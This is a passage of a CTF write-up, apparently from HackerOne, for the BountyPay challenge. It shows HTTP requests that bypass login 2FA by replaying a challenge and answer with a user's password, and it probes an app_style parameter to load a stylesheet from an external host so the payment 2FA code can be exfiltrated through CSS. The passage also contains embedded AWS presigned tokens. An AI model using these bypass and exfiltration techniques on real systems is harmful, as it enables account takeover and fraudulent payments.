data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/JhZy42jGednjJPbk1xvzuttL?response-content-disposition=attachment%3B%20filename%3D%22completed-priv-esc.png%22%3B%20filename%2A%3DUTF-8%27%27completed-priv-esc.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQSUJSTWNA%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T070811Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQDC4LZo82wc2eCvBFlhjwE027CwJoHB88%2BMK2v03JEf7AIgTsNTuR7XI5zLkpcU%2F192zliPMALv25wXWHyoW56mHW0qtAMIVRABGgwwMTM2MTkyNzQ4NDkiDDQxd6Ep%2FudaJolhjiqRA%2FV9m3Q5qTHiEf%2B0F56QxIa0FX4xcw3kyVQ754zuEWG6%2FFHm5u50c%2FkjIZTK4iokf%2F5bg8%2F9lzPcfaf%2FlyMeeuZQiIR66c8Q0ZynlQYFFg39COCCRcmQH0rk4Py7SioeZK1WX50szdnMCAEBM0%2FYGIJRFlpJYz5%2BF7cuCEDZDVFz70QPaeLM9Aq2Hp0OWlaD%2BlKU2Ya8oXmKGTVLeV6xTf66mRdzvW8I4qKgZpByKnAcip5WWnkttPjUxPiLaEeZ%2BClnUyHZas2bB1iPmPH0rQXcKWbTOq%2BJJm8xX%2FgqtqSgjGTmncJVZJxe0UaRUPXS%2BxPh0KYERT9Te4D5sREOcmaPJ0lojWm5AuNIxK3S30FeTamdldG5jOgcjm7r6e2HjWcB7yfe4%2BCsYd2eVLbbXk95jZRHQohr%2B7Z9YEqq00TUANe07BXm%2FKoAPBMy0bYQHYmVJaGS31XhmN6DRKUn5mwwU6NQ87eIymigu48swQSaSOa0S3Ve15n99tYKCLxw%2FqcLrXK9DmAPRXyB2cTH85tpMJ7Qqv8FOusB0TY7T%2F8PPlS9Pw17cj5sLPnZSdHFb4OJ7xNuArhvZUxC%2FDdQIpfgbN40hDHy3r94ejzq63ULcWroBoxExSJ8F%2BIqLrT2jEE%2BHYV9rJ3uN20mlrWN07M1wfpVQeu7mZyiWu%2BTKEOjyLznji7d3Efn7A1SwzF%2FWi11RcA9%2BGeNTFCiOeyJRV4JWopx6NNi8TVr6hBraJmZeqXIUCIj4yW%2BvdbZ%2F7b%2BDWNq1S8BMna3Htt9r6lmeANRYdDH%2BkiA2F6n7nJrrrNm3hF7NHjHy1GdUin3XffXKseDfHdRNqxNelH1SrChi2zziLtHrQ%3D%3D\u0026amp;X-Amz-Signature=5f9b84b4f29b0f57ae2bb1b8dadb9cb140c94289b8e86d4897864012e1259eb8\" data-attachment-type=\"image/png\"\u003e\u003cimg src=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/JhZy42jGednjJPbk1xvzuttL?response-content-disposition=attachment%3B%20filename%3D%22completed-priv-esc.png%22%3B%20filename%2A%3DUTF-8%27%27completed-priv-esc.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQSUJSTWNA%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T070811Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQDC4LZo82wc2eCvBFlhjwE027CwJoHB88%2BMK2v03JEf7AIgTsNTuR7XI5zLkpcU%2F192zliPMALv25wXWHyoW56mHW0qtAMIVRABGgwwMTM2MTkyNzQ4NDkiDDQxd6Ep%2FudaJolhjiqRA%2FV9m3Q5qTHiEf%2B0F56QxIa0FX4xcw3kyVQ754zuEWG6%2FFHm5u50c%2FkjIZTK4iokf%2F5bg8%2F9lzPcfaf%2FlyMeeuZQiIR66c8Q0ZynlQYFFg39COCCRcmQH0rk4Py7SioeZK1WX50szdnMCAEBM0%2FYGIJRFlpJYz5%2BF7cuCEDZDVFz70QPaeLM9Aq2Hp0OWlaD%2BlKU2Ya8oXmKGTVLeV6xTf66mRdzvW8I4qKgZpByKnAcip5WWnkttPjUxPiLaEeZ%2BClnUyHZas2bB1iPmPH0rQXcKWbTOq%2BJJm8xX%2FgqtqSgjGTmncJVZJxe0UaRUPXS%2BxPh0KYERT9Te4D5sREOcmaPJ0lojWm5AuNIxK3S30FeTamdldG5jOgcjm7r6e2HjWcB7yfe4%2BCsYd2eVLbbXk95jZRHQohr%2B7Z9YEqq00TUANe07BXm%2FKoAPBMy0bYQHYmVJaGS31XhmN6DRKUn5mwwU6NQ87eIymigu48swQSaSOa0S3Ve15n99tYKCLxw%2FqcLrXK9DmAPRXyB2cTH85tpMJ7Qqv8FOusB0TY7T%2F8PPlS9Pw17cj5sLPnZSdHFb4OJ7xNuArhvZUxC%2FDdQIpfgbN40hDHy3r94ejzq63ULcWroBoxExSJ8F%2BIqLrT2jEE%2BHYV9rJ3uN20mlrWN07M1wfpVQeu7mZyiWu%2BTKEOjyLznji7d3Efn7A1SwzF%2FWi11RcA9%2BGeNTFCiOeyJRV4JWopx6NNi8TVr6hBraJmZeqXIUCIj4yW%2BvdbZ%2F7b%2BDWNq1S8BMna3Htt9r6lmeANRYdDH%2BkiA2F6n7nJrrrNm3hF7NHjHy1GdUin3XffXKseDfHdRNqxNelH1SrChi2zziLtHrQ%3D%3D\u0026amp;X-Amz-Signature=5f9b84b4f29b0f57ae2bb1b8dadb9cb140c94289b8e86d4897864012e1259eb8\" class=\"markdown-inline-image\" style=\"display: inline-block\"\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003eOne last thing that wasn\u0026#39;t clear to me is what \u003ccode\u003e/?template=admin\u003c/code\u003e was for. I visited it, and it just returned \u003ccode\u003eview admin\u003c/code\u003e string... Must have just been added to divert attention.\u003c/p\u003e\n\n\u003ch2 id=\"payment-2fa-bypass-css-exfiltration\"\u003ePayment 2FA Bypass / CSS Exfiltration\u003c/h2\u003e\n\n\u003cp\u003eBack to customer portal at \u003ccode\u003eapp.bountypay.h1ctf.com\u003c/code\u003e we login with Mårten\u0026#39;s credentials. We use the same \u003ccode\u003echallenge\u003c/code\u003e and \u003ccode\u003echallenge_answer\u003c/code\u003e as before to bypass login 2FA:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight http\"\u003e\u003ccode\u003e\u003cspan class=\"nf\"\u003ePOST\u003c/span\u003e \u003cspan class=\"nn\"\u003e/\u003c/span\u003e \u003cspan class=\"k\"\u003eHTTP\u003c/span\u003e\u003cspan class=\"o\"\u003e/\u003c/span\u003e\u003cspan class=\"m\"\u003e1.1\u003c/span\u003e\n\u003cspan class=\"na\"\u003eHost\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s\"\u003eapp.bountypay.h1ctf.com\u003c/span\u003e\n\u003cspan class=\"na\"\u003eContent-Type\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s\"\u003eapplication/x-www-form-urlencoded\u003c/span\u003e\n\nusername=marten.mickos\u0026amp;password=h%26H5wy2Lggj*kKn4OD%26Ype\u0026amp;challenge=5828c689761cce705a1c84d9b1a1ed5e\u0026amp;challenge_answer=bD83Jk27dQ\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight http\"\u003e\u003ccode\u003e\u003cspan class=\"k\"\u003eHTTP\u003c/span\u003e\u003cspan class=\"o\"\u003e/\u003c/span\u003e\u003cspan class=\"m\"\u003e1.1\u003c/span\u003e \u003cspan class=\"m\"\u003e302\u003c/span\u003e \u003cspan class=\"ne\"\u003eFound\u003c/span\u003e\n\u003cspan class=\"na\"\u003eSet-Cookie\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s\"\u003etoken=eyJhY2NvdW50X2lkIjoiQWU4aUpMa245eiIsImhhc2giOiIzNjE2ZDZiMmMxNWU1MGMwMjQ4YjIyNzZiNDg0ZGRiMiJ9; expires=Mon, 06-Jul-2020 23:56:57 GMT; Max-Age=2592000\u003c/span\u003e\n\u003cspan class=\"na\"\u003eLocation\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s\"\u003e/\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eRecall the original CTF tweet, and that we need to help Mårten approve May bug bounty payments. We thus fetch transactions for May 2020 and we indeed get a valid response this time:\u003cbr\u003e\n\u003ca class=\"markdown-attachment-link markdown-attachment-inline-reference\" data-attachment-filename=\"may-transactions-to-process.png\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/hS9qyX8uUeRFcS5EvCtcc375?response-content-disposition=attachment%3B%20filename%3D%22may-transactions-to-process.png%22%3B%20filename%2A%3DUTF-8%27%27may-transactions-to-process.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQSUJSTWNA%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T070811Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQDC4LZo82wc2eCvBFlhjwE027CwJoHB88%2BMK2v03JEf7AIgTsNTuR7XI5zLkpcU%2F192zliPMALv25wXWHyoW56mHW0qtAMIVRABGgwwMTM2MTkyNzQ4NDkiDDQxd6Ep%2FudaJolhjiqRA%2FV9m3Q5qTHiEf%2B0F56QxIa0FX4xcw3kyVQ754zuEWG6%2FFHm5u50c%2FkjIZTK4iokf%2F5bg8%2F9lzPcfaf%2FlyMeeuZQiIR66c8Q0ZynlQYFFg39COCCRcmQH0rk4Py7SioeZK1WX50szdnMCAEBM0%2FYGIJRFlpJYz5%2BF7cuCEDZDVFz70QPaeLM9Aq2Hp0OWlaD%2BlKU2Ya8oXmKGTVLeV6xTf66mRdzvW8I4qKgZpByKnAcip5WWnkttPjUxPiLaEeZ%2BClnUyHZas2bB1iPmPH0rQXcKWbTOq%2BJJm8xX%2FgqtqSgjGTmncJVZJxe0UaRUPXS%2BxPh0KYERT9Te4D5sREOcmaPJ0lojWm5AuNIxK3S30FeTamdldG5jOgcjm7r6e2HjWcB7yfe4%2BCsYd2eVLbbXk95jZRHQohr%2B7Z9YEqq00TUANe07BXm%2FKoAPBMy0bYQHYmVJaGS31XhmN6DRKUn5mwwU6NQ87eIymigu48swQSaSOa0S3Ve15n99tYKCLxw%2FqcLrXK9DmAPRXyB2cTH85tpMJ7Qqv8FOusB0TY7T%2F8PPlS9Pw17cj5sLPnZSdHFb4OJ7xNuArhvZUxC%2FDdQIpfgbN40hDHy3r94ejzq63ULcWroBoxExSJ8F%2BIqLrT2jEE%2BHYV9rJ3uN20mlrWN07M1wfpVQeu7mZyiWu%2BTKEOjyLznji7d3Efn7A1SwzF%2FWi11RcA9%2BGeNTFCiOeyJRV4JWopx6NNi8TVr6hBraJmZeqXIUCIj4yW%2BvdbZ%2F7b%2BDWNq1S8BMna3Htt9r6lmeANRYdDH%2BkiA2F6n7nJrrrNm3hF7NHjHy1GdUin3XffXKseDfHdRNqxNelH1SrChi2zziLtHrQ%3D%3D\u0026amp;X-Amz-Signature=0f7cd93b33cf31244d056efe35b515713cb0308057394c51601a91ac236a85a8\" data-attachment-type=\"image/png\"\u003e\u003cimg src=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/hS9qyX8uUeRFcS5EvCtcc375?response-content-disposition=attachment%3B%20filename%3D%22may-transactions-to-process.png%22%3B%20filename%2A%3DUTF-8%27%27may-transactions-to-process.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQSUJSTWNA%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T070811Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQDC4LZo82wc2eCvBFlhjwE027CwJoHB88%2BMK2v03JEf7AIgTsNTuR7XI5zLkpcU%2F192zliPMALv25wXWHyoW56mHW0qtAMIVRABGgwwMTM2MTkyNzQ4NDkiDDQxd6Ep%2FudaJolhjiqRA%2FV9m3Q5qTHiEf%2B0F56QxIa0FX4xcw3kyVQ754zuEWG6%2FFHm5u50c%2FkjIZTK4iokf%2F5bg8%2F9lzPcfaf%2FlyMeeuZQiIR66c8Q0ZynlQYFFg39COCCRcmQH0rk4Py7SioeZK1WX50szdnMCAEBM0%2FYGIJRFlpJYz5%2BF7cuCEDZDVFz70QPaeLM9Aq2Hp0OWlaD%2BlKU2Ya8oXmKGTVLeV6xTf66mRdzvW8I4qKgZpByKnAcip5WWnkttPjUxPiLaEeZ%2BClnUyHZas2bB1iPmPH0rQXcKWbTOq%2BJJm8xX%2FgqtqSgjGTmncJVZJxe0UaRUPXS%2BxPh0KYERT9Te4D5sREOcmaPJ0lojWm5AuNIxK3S30FeTamdldG5jOgcjm7r6e2HjWcB7yfe4%2BCsYd2eVLbbXk95jZRHQohr%2B7Z9YEqq00TUANe07BXm%2FKoAPBMy0bYQHYmVJaGS31XhmN6DRKUn5mwwU6NQ87eIymigu48swQSaSOa0S3Ve15n99tYKCLxw%2FqcLrXK9DmAPRXyB2cTH85tpMJ7Qqv8FOusB0TY7T%2F8PPlS9Pw17cj5sLPnZSdHFb4OJ7xNuArhvZUxC%2FDdQIpfgbN40hDHy3r94ejzq63ULcWroBoxExSJ8F%2BIqLrT2jEE%2BHYV9rJ3uN20mlrWN07M1wfpVQeu7mZyiWu%2BTKEOjyLznji7d3Efn7A1SwzF%2FWi11RcA9%2BGeNTFCiOeyJRV4JWopx6NNi8TVr6hBraJmZeqXIUCIj4yW%2BvdbZ%2F7b%2BDWNq1S8BMna3Htt9r6lmeANRYdDH%2BkiA2F6n7nJrrrNm3hF7NHjHy1GdUin3XffXKseDfHdRNqxNelH1SrChi2zziLtHrQ%3D%3D\u0026amp;X-Amz-Signature=0f7cd93b33cf31244d056efe35b515713cb0308057394c51601a91ac236a85a8\" class=\"markdown-inline-image\" style=\"display: inline-block\"\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003eWhen we click Pay, however, we\u0026#39;re presented with another 2FA challenge:\u003cbr\u003e\n\u003ca class=\"markdown-attachment-link markdown-attachment-inline-reference\" data-attachment-filename=\"transaction-approval-2fa-page.png\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/HKGUFNAMo9dJX8UG6qm1TW2o?response-content-disposition=attachment%3B%20filename%3D%22transaction-approval-2fa-page.png%22%3B%20filename%2A%3DUTF-8%27%27transaction-approval-2fa-page.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQSUJSTWNA%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T070811Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQDC4LZo82wc2eCvBFlhjwE027CwJoHB88%2BMK2v03JEf7AIgTsNTuR7XI5zLkpcU%2F192zliPMALv25wXWHyoW56mHW0qtAMIVRABGgwwMTM2MTkyNzQ4NDkiDDQxd6Ep%2FudaJolhjiqRA%2FV9m3Q5qTHiEf%2B0F56QxIa0FX4xcw3kyVQ754zuEWG6%2FFHm5u50c%2FkjIZTK4iokf%2F5bg8%2F9lzPcfaf%2FlyMeeuZQiIR66c8Q0ZynlQYFFg39COCCRcmQH0rk4Py7SioeZK1WX50szdnMCAEBM0%2FYGIJRFlpJYz5%2BF7cuCEDZDVFz70QPaeLM9Aq2Hp0OWlaD%2BlKU2Ya8oXmKGTVLeV6xTf66mRdzvW8I4qKgZpByKnAcip5WWnkttPjUxPiLaEeZ%2BClnUyHZas2bB1iPmPH0rQXcKWbTOq%2BJJm8xX%2FgqtqSgjGTmncJVZJxe0UaRUPXS%2BxPh0KYERT9Te4D5sREOcmaPJ0lojWm5AuNIxK3S30FeTamdldG5jOgcjm7r6e2HjWcB7yfe4%2BCsYd2eVLbbXk95jZRHQohr%2B7Z9YEqq00TUANe07BXm%2FKoAPBMy0bYQHYmVJaGS31XhmN6DRKUn5mwwU6NQ87eIymigu48swQSaSOa0S3Ve15n99tYKCLxw%2FqcLrXK9DmAPRXyB2cTH85tpMJ7Qqv8FOusB0TY7T%2F8PPlS9Pw17cj5sLPnZSdHFb4OJ7xNuArhvZUxC%2FDdQIpfgbN40hDHy3r94ejzq63ULcWroBoxExSJ8F%2BIqLrT2jEE%2BHYV9rJ3uN20mlrWN07M1wfpVQeu7mZyiWu%2BTKEOjyLznji7d3Efn7A1SwzF%2FWi11RcA9%2BGeNTFCiOeyJRV4JWopx6NNi8TVr6hBraJmZeqXIUCIj4yW%2BvdbZ%2F7b%2BDWNq1S8BMna3Htt9r6lmeANRYdDH%2BkiA2F6n7nJrrrNm3hF7NHjHy1GdUin3XffXKseDfHdRNqxNelH1SrChi2zziLtHrQ%3D%3D\u0026amp;X-Amz-Signature=0d382436a8b87e22775089e61de2e2cdd71a14c190f1932818ccf4c0e032054d\" data-attachment-type=\"image/png\"\u003e\u003cimg src=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/HKGUFNAMo9dJX8UG6qm1TW2o?response-content-disposition=attachment%3B%20filename%3D%22transaction-approval-2fa-page.png%22%3B%20filename%2A%3DUTF-8%27%27transaction-approval-2fa-page.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQSUJSTWNA%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T070811Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQDC4LZo82wc2eCvBFlhjwE027CwJoHB88%2BMK2v03JEf7AIgTsNTuR7XI5zLkpcU%2F192zliPMALv25wXWHyoW56mHW0qtAMIVRABGgwwMTM2MTkyNzQ4NDkiDDQxd6Ep%2FudaJolhjiqRA%2FV9m3Q5qTHiEf%2B0F56QxIa0FX4xcw3kyVQ754zuEWG6%2FFHm5u50c%2FkjIZTK4iokf%2F5bg8%2F9lzPcfaf%2FlyMeeuZQiIR66c8Q0ZynlQYFFg39COCCRcmQH0rk4Py7SioeZK1WX50szdnMCAEBM0%2FYGIJRFlpJYz5%2BF7cuCEDZDVFz70QPaeLM9Aq2Hp0OWlaD%2BlKU2Ya8oXmKGTVLeV6xTf66mRdzvW8I4qKgZpByKnAcip5WWnkttPjUxPiLaEeZ%2BClnUyHZas2bB1iPmPH0rQXcKWbTOq%2BJJm8xX%2FgqtqSgjGTmncJVZJxe0UaRUPXS%2BxPh0KYERT9Te4D5sREOcmaPJ0lojWm5AuNIxK3S30FeTamdldG5jOgcjm7r6e2HjWcB7yfe4%2BCsYd2eVLbbXk95jZRHQohr%2B7Z9YEqq00TUANe07BXm%2FKoAPBMy0bYQHYmVJaGS31XhmN6DRKUn5mwwU6NQ87eIymigu48swQSaSOa0S3Ve15n99tYKCLxw%2FqcLrXK9DmAPRXyB2cTH85tpMJ7Qqv8FOusB0TY7T%2F8PPlS9Pw17cj5sLPnZSdHFb4OJ7xNuArhvZUxC%2FDdQIpfgbN40hDHy3r94ejzq63ULcWroBoxExSJ8F%2BIqLrT2jEE%2BHYV9rJ3uN20mlrWN07M1wfpVQeu7mZyiWu%2BTKEOjyLznji7d3Efn7A1SwzF%2FWi11RcA9%2BGeNTFCiOeyJRV4JWopx6NNi8TVr6hBraJmZeqXIUCIj4yW%2BvdbZ%2F7b%2BDWNq1S8BMna3Htt9r6lmeANRYdDH%2BkiA2F6n7nJrrrNm3hF7NHjHy1GdUin3XffXKseDfHdRNqxNelH1SrChi2zziLtHrQ%3D%3D\u0026amp;X-Amz-Signature=0d382436a8b87e22775089e61de2e2cdd71a14c190f1932818ccf4c0e032054d\" class=\"markdown-inline-image\" style=\"display: inline-block\"\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003eOk. let\u0026#39;s intercept the next request (when we click on \u0026quot;Send Challenge\u0026quot; button) and see what it looks like:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight http\"\u003e\u003ccode\u003e\u003cspan class=\"nf\"\u003ePOST\u003c/span\u003e \u003cspan class=\"nn\"\u003e/pay/17538771/27cd1393c170e1e97f9507a5351ea1ba\u003c/span\u003e \u003cspan class=\"k\"\u003eHTTP\u003c/span\u003e\u003cspan class=\"o\"\u003e/\u003c/span\u003e\u003cspan class=\"m\"\u003e1.1\u003c/span\u003e\n\u003cspan class=\"na\"\u003eHost\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s\"\u003eapp.bountypay.h1ctf.com\u003c/span\u003e\n\u003cspan class=\"na\"\u003eContent-Type\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s\"\u003eapplication/x-www-form-urlencoded\u003c/span\u003e\n\u003cspan class=\"na\"\u003eCookie\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s\"\u003etoken=eyJhY2NvdW50X2lkIjoiQWU4aUpMa245eiIsImhhc2giOiIzNjE2ZDZiMmMxNWU1MGMwMjQ4YjIyNzZiNDg0ZGRiMiJ9\u003c/span\u003e\n\napp_style=https%3A%2F%2Fwww.bountypay.h1ctf.com%2Fcss%2Funi_2fa_style.css\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eAnd the relevant HTML snippet from the response:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight html\"\u003e\u003ccode\u003e\u003cspan class=\"nt\"\u003e\u0026lt;h1\u003c/span\u003e \u003cspan class=\"na\"\u003eclass=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;text-center\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u003c/span\u003eBountyPay\u003cspan class=\"nt\"\u003e\u0026lt;/h1\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;h3\u003c/span\u003e \u003cspan class=\"na\"\u003eclass=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;text-center\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u003c/span\u003e2FA Payment Challenge\u003cspan class=\"nt\"\u003e\u0026lt;/h3\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;form\u003c/span\u003e \u003cspan class=\"na\"\u003emethod=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;post\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u003c/span\u003e\n    \u003cspan class=\"nt\"\u003e\u0026lt;input\u003c/span\u003e \u003cspan class=\"na\"\u003etype=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;hidden\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003ename=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;challenge_timeout\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003evalue=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;1591490942\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u003c/span\u003e\n    \u003cspan class=\"nt\"\u003e\u0026lt;input\u003c/span\u003e \u003cspan class=\"na\"\u003etype=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;hidden\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003ename=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;challenge\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003evalue=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;2cf37bd3c17d4621658828b374579adb\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u003c/span\u003e\n    \u003cspan class=\"nt\"\u003e\u0026lt;div\u003c/span\u003e \u003cspan class=\"na\"\u003eclass=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;panel panel-default\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003estyle=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;margin-top:50px\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u003c/span\u003e\n        \u003cspan class=\"nt\"\u003e\u0026lt;div\u003c/span\u003e \u003cspan class=\"na\"\u003eclass=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;panel-heading\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u003c/span\u003ePayment Challenge Sent\u003cspan class=\"nt\"\u003e\u0026lt;/div\u0026gt;\u003c/span\u003e\n        \u003cspan class=\"nt\"\u003e\u0026lt;div\u003c/span\u003e \u003cspan class=\"na\"\u003eclass=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;panel-body text-center\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u003c/span\u003e\n            \u003cspan class=\"nt\"\u003e\u0026lt;p\u0026gt;\u003c/span\u003eWe have sent the payment challenge to your 2FA, you have 2 minutes to enter the code, please enter it below\u003cspan class=\"nt\"\u003e\u0026lt;/p\u0026gt;\u003c/span\u003e\n            \u003cspan class=\"nt\"\u003e\u0026lt;div\u0026gt;\u0026lt;input\u003c/span\u003e \u003cspan class=\"na\"\u003ename=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;challenge_answer\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003eclass=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;form-control\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003emaxlength=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;7\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u0026lt;/div\u0026gt;\u003c/span\u003e\n        \u003cspan class=\"nt\"\u003e\u0026lt;/div\u0026gt;\u003c/span\u003e\n    \u003cspan class=\"nt\"\u003e\u0026lt;/div\u0026gt;\u003c/span\u003e\n    \u003cspan class=\"nt\"\u003e\u0026lt;input\u003c/span\u003e \u003cspan class=\"na\"\u003etype=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;submit\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003eclass=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;btn btn-success pull-right\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003evalue=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;Send Answer\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;/form\u0026gt;\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eIssuing the request a few more times I confirmed that we\u0026#39;re presented with a new \u003ccode\u003echallenge\u003c/code\u003evalue every time, and our goal is to get the right \u003ccode\u003echallenge_answer\u003c/code\u003e for it, which shouldn\u0026#39;t be longer than 7 characters (\u003ccode\u003emaxlength=\u0026quot;7\u0026quot;\u003c/code\u003e).The only unusual thing about this is that the POST request contains \u003ccode\u003eapp_style\u003c/code\u003e parameter which references a stylesheet from \u003ccode\u003ehttps://www.bountypay.h1ctf.com/css/uni_2fa_style.css\u003c/code\u003e.\u003c/p\u003e\n\n\u003cp\u003eThis seems a lot like we\u0026#39;re going to need to exfiltrate \u003ccode\u003echallenge_answer\u003c/code\u003ewith CSS, but let\u0026#39;s confirm step by step.\u003c/p\u003e\n\n\u003cp\u003eFirstly, I\u0026#39;ve made a request using Burp Collaborator payload to confirm we can fetch a stylesheet from an arbitrary external resource:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight http\"\u003e\u003ccode\u003e\u003cspan class=\"nf\"\u003ePOST\u003c/span\u003e \u003cspan class=\"nn\"\u003e/pay/17538771/27cd1393c170e1e97f9507a5351ea1ba\u003c/span\u003e \u003cspan 